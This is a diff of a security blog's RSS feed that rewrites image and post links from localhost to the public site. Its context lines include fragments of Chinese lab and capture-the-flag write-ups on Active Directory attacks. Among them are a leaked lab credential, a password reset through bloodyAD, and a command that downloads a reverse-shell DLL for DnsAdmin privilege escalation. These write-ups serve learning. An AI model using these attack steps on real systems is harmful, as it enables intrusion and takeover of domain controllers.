 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;WINRM       10.129.203.20   &lt;span style=&#34;color:#ae81ff&#34;&gt;5985&lt;/span&gt;   INVENTORY        &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; sweep.vl&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;vc_inventory_lnx:0|5m-U6?/uAX
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;存在权限但是没有winrm，回头这个用户的猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-6.png&#34;
 	
 	
 	
@@ -1275,7 +1275,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;有出站，可以将自己添加入LANSWEEPER ADMINS组，并且LANSWEEPER ADMINS组属于远程管理组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/sweep/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/sweep/image-7.png&#34;
 	
 	
 	
@@ -1412,10 +1412,10 @@
         </item>
         <item>
         <title>802.11帧介绍</title>
-        <link>http://localhost:1313/post/80211/</link>
+        <link>https://wackymaker.github.io/post/80211/</link>
         <pubDate>Wed, 27 Aug 2025 20:57:07 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/80211/</guid>
+        <guid>https://wackymaker.github.io/post/80211/</guid>
         <description>&lt;h2 id=&#34;80211帧简介&#34;&gt;802.11帧简介
 &lt;/h2&gt;&lt;p&gt;有线网络传输以太网帧而wifi无线网传输802.11帧，802.11帧数是ieee（电气和电子工程协会）定义的wifi标准系列，当我们的设备通过无线接入点（AP）通信的时候，双方并不是直接发送流量包，而是先通过802.11MAC层帧在空中交换信息，这些帧包括控制，管理和数据，共同构成wifi的整个连接和通信过程&lt;/p&gt;
 &lt;h2 id=&#34;80211-mac帧介绍&#34;&gt;802.11 mac帧介绍
@@ -1515,7 +1515,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set wlan0 up &lt;span style=&#34;color:#75715e&#34;&gt;#启动网卡&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iwconfig wlan0 &lt;span style=&#34;color:#75715e&#34;&gt;#查看当前网卡模式&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当我们将网卡切换监听模式后，wireshark会抓到大量数据包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image.png&#34;
 	
 	
 	
@@ -1525,7 +1525,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;我们可以通过wireshark中的语法以及以上我们学习的帧类型进行查找&lt;/p&gt;
 &lt;p&gt;查找来自ap的接入帧：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 8)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-1.png&#34;
 	
 	
 	
@@ -1534,7 +1534,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查找来自ap的探测请求帧：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 4)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-2.png&#34;
 	
 	
 	
@@ -1544,7 +1544,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;查找来自ap的探测响应帧：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 5)&lt;/p&gt;
 &lt;p&gt;这里我抓包的时候并未请求响应所以显示的包为，所以找了htb文章的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-3.png&#34;
 	
 	
 	
@@ -1553,7 +1553,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可以用以下过滤器查找客户端和接入点之间的身份验证过程：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 11)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-4.png&#34;
 	
 	
 	
@@ -1562,7 +1562,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;请求结束后，可以抓取到关联请求：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 0)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-6.png&#34;
 	
 	
 	
@@ -1571,7 +1571,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;查看关联响应：(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 1)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-7.png&#34;
 	
 	
 	
@@ -1580,7 +1580,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;如果网络使用wpa2，可以使用EAPOL查看握手帧&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-8.png&#34;
 	
 	
 	
@@ -1589,7 +1589,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;连接完成后，可以通过如下过滤器查看取消关联帧或者身份验证帧:(wlan.fc.type == 0) &amp;amp;&amp;amp; (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/80211/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/80211/image-9.png&#34;
 	
 	
 	
@@ -1601,10 +1601,10 @@
         </item>
         <item>
         <title>OpTinselTrace4-wp</title>
-        <link>http://localhost:1313/post/optinseltrace4/</link>
+        <link>https://wackymaker.github.io/post/optinseltrace4/</link>
         <pubDate>Wed, 27 Aug 2025 14:56:36 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/optinseltrace4/</guid>
+        <guid>https://wackymaker.github.io/post/optinseltrace4/</guid>
         <description>&lt;h2 id=&#34;题目简介&#34;&gt;题目简介
 &lt;/h2&gt;&lt;p&gt;打印机在圣诞老人的工作室中很重要，但我们还没有真正尝试确保它们的安全！格林奇和他的精英黑客团队可能会试图利用它来对付我们！请使用提供的数据包捕获进行调查！打印机服务器 IP 地址为 192.168.68.128 请注意 - 这些 Sherlocks 是按顺序完成的！&lt;/p&gt;
 &lt;p&gt;附件信息&lt;/p&gt;
@@ -1615,7 +1615,7 @@
 &lt;h2 id=&#34;攻击ip地址为&#34;&gt;攻击ip地址为？
 &lt;/h2&gt;&lt;p&gt;题目原文（网络打印机服务器的性能变得缓慢，导致北极车间的工作流程中断。圣诞老人指示我们生成支持请求并检查网络数据以查明问题的根源。他怀疑格林奇和他的团队可能参与了这种情况。您能否验证是否有向打印机服务器发送过多流量的 IP 地址？）&lt;/p&gt;
 &lt;p&gt;打开文件包，一共3800多个包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image.png&#34;
 	
 	
 	
@@ -1624,7 +1624,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;提供给了我们打印机的ip地址，只需要过滤出打印机ip就能找到请求最多的ip&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-1.png&#34;
 	
 	
 	
@@ -1636,7 +1636,7 @@
 &lt;h2 id=&#34;最终攻击端口&#34;&gt;最终攻击端口
 &lt;/h2&gt;&lt;p&gt;题目原文（Bytesparkle 作为技术负责人，发现了来自先前攻击中识别的同一 IP 的端口扫描痕迹。然后，哪个端口是打印机最初入侵的目标？）&lt;/p&gt;
 &lt;p&gt;过滤攻击ip，并锁定初步攻击时的流量包，我们能找到攻击者对9100端口进行了大量访问&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-2.png&#34;
 	
 	
 	
@@ -1647,7 +1647,7 @@
 &lt;p&gt;答案；9100&lt;/p&gt;
 &lt;h2 id=&#34;服务器上运行的打印机的全名是什么&#34;&gt;服务器上运行的打印机的全名是什么？
 &lt;/h2&gt;&lt;p&gt;随便找几个9100的包追踪tcp，我们能找到如下文本&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-3.png&#34;
 	
 	
 	
@@ -1658,7 +1658,7 @@
 &lt;p&gt;答案： Northpole HP LaserJet 4200n&lt;/p&gt;
 &lt;h2 id=&#34;格林奇截获了一份圣诞老人制作的善良和顽皮孩子的名单好名单上的第二个孩子叫什么名字&#34;&gt;格林奇截获了一份圣诞老人制作的善良和顽皮孩子的名单。好名单上的第二个孩子叫什么名字？
 &lt;/h2&gt;&lt;p&gt;并不太理解打印机流量数据中的内容，于是我继续分析刚才追踪的tcp，找到了类似名单的东西&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-4.png&#34;
 	
 	
 	
@@ -1684,7 +1684,7 @@
 &lt;/h2&gt;&lt;p&gt;题目原文（格林奇获得了一份打印作业指令文件，该文件用于一位名叫埃尔芬的员工使用的打印机。看来圣诞老人和北极管理团队已经做出了解雇 Elfin 的决定。您能否提供终止 Elfin 雇佣关系的决定背后的逐字理由？）&lt;/p&gt;
 &lt;p&gt;我们过滤data字段，查找和这个id有关的包&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data contains &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Elfin&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-5.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-5.png&#34;
 	
 	
 	
@@ -1697,7 +1697,7 @@
 &lt;p&gt;答案：The addressed employee is confirmed to be working with grinch and team. According to Clause 69 , This calls for an immediate expulsion.&lt;/p&gt;
 &lt;h2 id=&#34;计划打印作业的名称是什么&#34;&gt;计划打印作业的名称是什么？
 &lt;/h2&gt;&lt;p&gt;过滤Job,我们能找到大约几十个流量包&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-6.png&#34;
 	
 	
 	
@@ -1708,7 +1708,7 @@
 &lt;p&gt;随便点一个追踪流，可惜都是打印机的打印任务，找不到有用的，但是我意识到计划任务应该会有start关键词&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data contains &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Start&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只有一个数据包，但是当中存在我们需要的内容&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-7.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-7.png&#34;
 	
 	
 	
@@ -1721,7 +1721,7 @@
 &lt;/h2&gt;&lt;p&gt;题目（在我们对当前数据包捕获的持续分析中，情况已经惊人地升级。我们的安全系统在一台高度关键的服务器上检测到了漏洞利用后活动的迹象，该服务器本应通过仅使用 SSH 密钥进行安全访问。这一事态发展引起了安全团队的严重担忧。在 Bytesparkle 调查此次违规行为时，他推测此次安全事件可能与早期的打印机问题有关。您能否确定并提供打印机服务器上使格林奇能够横向移动到此关键服务器的文件的完整路径？）&lt;/p&gt;
 &lt;p&gt;看来关键在于ssh&lt;/p&gt;
 &lt;p&gt;过滤后发现与上一题tcp流一致，都在46流&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-8.png&#34;
 	
 	
 	
@@ -1740,7 +1740,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;答案：christmas.gifts&lt;/p&gt;
 &lt;h2 id=&#34;格林奇什么时候试图从打印机中删除文件utc&#34;&gt;格林奇什么时候试图从打印机中删除文件？（UTC）
 &lt;/h2&gt;&lt;p&gt;这道题我找了很久，并不在28或者46流，当过来吧DELETE后我们找到了结果&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/OpTinselTrace4/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/OpTinselTrace4/image-9.png&#34;
 	
 	
 	
@@ -1754,10 +1754,10 @@
         </item>
         <item>
         <title>基于DnsAdmin组的dns热重载权限维持及衍生情况</title>
-        <link>http://localhost:1313/post/dnsadmin/</link>
+        <link>https://wackymaker.github.io/post/dnsadmin/</link>
         <pubDate>Mon, 25 Aug 2025 18:50:52 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/dnsadmin/</guid>
+        <guid>https://wackymaker.github.io/post/dnsadmin/</guid>
         <description>&lt;h2 id=&#34;本文所使用环境&#34;&gt;本文所使用环境
 &lt;/h2&gt;&lt;p&gt;这篇环境当中，我使用的是我自建靶机&lt;a class=&#34;link&#34; href=&#34;https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;bicker&lt;/a&gt;,其中tindalos就是dnsadmin组&lt;/p&gt;
@@ -1913,7 +1913,7 @@
 &lt;h2 id=&#34;攻击路径检测难度&#34;&gt;攻击路径检测难度
 &lt;/h2&gt;&lt;p&gt;那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？&lt;/p&gt;
 &lt;p&gt;通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/dnsadmin/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/dnsadmin/image.png&#34;
 	
 	
 	
@@ -1974,10 +1974,10 @@
         </item>
         <item>
         <title>bicker-wp</title>
-        <link>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</link>
+        <link>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</link>
         <pubDate>Mon, 25 Aug 2025 15:15:18 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
+        <guid>https://wackymaker.github.io/post/bicher-%E8%87%AA%E5%BB%BA/</guid>
         <description>&lt;h2 id=&#34;信息收集&#34;&gt;信息收集
 &lt;/h2&gt;&lt;p&gt;主机确认&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/synthetic/bicker&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
@@ -2025,7 +2025,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 192.168.174.143:9389
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口&lt;/p&gt;
 &lt;h2 id=&#34;突破边界&#34;&gt;突破边界
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image.png&#34;
 	
 	
 	
@@ -2034,7 +2034,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;存在smb匿名，直接连接puppy，发现一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-1.png&#34;
 	
 	
 	
@@ -2043,7 +2043,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;一张意义不明的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-2.png&#34;
 	
 	
 	
@@ -2086,7 +2086,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Image Size                      : 620x381
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Megapixels                      : 0.236
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其中发现bilibili以及uid关键字，去b站查找到定位账号&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-3.png&#34;
 	
 	
 	
@@ -2140,7 +2140,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定&lt;/p&gt;
 &lt;p&gt;tindalos并未有稳定的出站，但是我找到了一个有意思的组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-4.png&#34;
 	
 	
 	
@@ -2212,7 +2212,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username    : lihua
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unknown     : hello%2633
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功解密出lihua的账户密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-5.png&#34;
 	
 	
 	
@@ -2221,7 +2221,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且能成功登陆，查看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-6.png&#34;
 	
 	
 	
@@ -2231,7 +2231,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &amp;lt;DC_IP&amp;gt; -d &amp;lt;域名&amp;gt; -u &amp;lt;管理员用户名&amp;gt; -p &amp;lt;管理员密码&amp;gt; set password &amp;lt;目标用户&amp;gt; &amp;lt;新密码&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-7.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-7.png&#34;
 	
 	
 	
@@ -2240,7 +2240,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用修改账号密码登陆&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-8.png&#34;
 	
 	
 	
@@ -2266,7 +2266,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.174.129/rev.dll&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\wirteTEMP\rev.dll&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是使用古法上传，之后利用tindalos注册此dll&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-9.png&#34;
 	
 	
 	
@@ -2276,7 +2276,7 @@
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意这一步是无法回头的，注意快照
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在jianyin用户上重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-10.png&#34;
 	
 	
 	
@@ -2285,7 +2285,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从另外一边的监听直接接受shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-11.png&#34;
 	
 	
 	
@@ -2294,7 +2294,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;权限为system成功获取rootflag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-12.png&#34;
 	
 	
 	
@@ -2307,10 +2307,10 @@
         </item>
         <item>
         <title>剥茧之书</title>
-        <link>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:42:11 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;事件日志分析&#34;&gt;事件日志分析
 &lt;/h2&gt;&lt;p&gt;Sysmon日志是由Microsoft系统监视器（Sysmon）生成的事件日志，它们提供有关Windows上的系统级操作的详细信息，并记录进程启动、网络连接、文件和注册表修改、驱动程序和服务活动以及WMI操作等活动，通过分析Sysmon日志，安全专家可以检测潜在风险、发现异常并响应安全事件，以增强整体系统监控和安全性。在不断变化的网络安全环境中，提前防范威胁非常重要。&lt;/p&gt;
 &lt;h3 id=&#34;event-id事件id&#34;&gt;Event ID(事件id)
@@ -2605,10 +2605,10 @@
         </item>
         <item>
         <title>渊蜂之书</title>
-        <link>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;钓鱼相关&#34;&gt;钓鱼相关
 &lt;/h2&gt;&lt;h3 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
 &lt;/h3&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
@@ -2762,6 +2762,10 @@
 &lt;/h2&gt;&lt;h3 id=&#34;linux连接wifi相关&#34;&gt;linux连接wifi相关
 &lt;/h3&gt;&lt;p&gt;查看无线网卡状态&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iwconfig
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;激活网卡&lt;/p&gt;
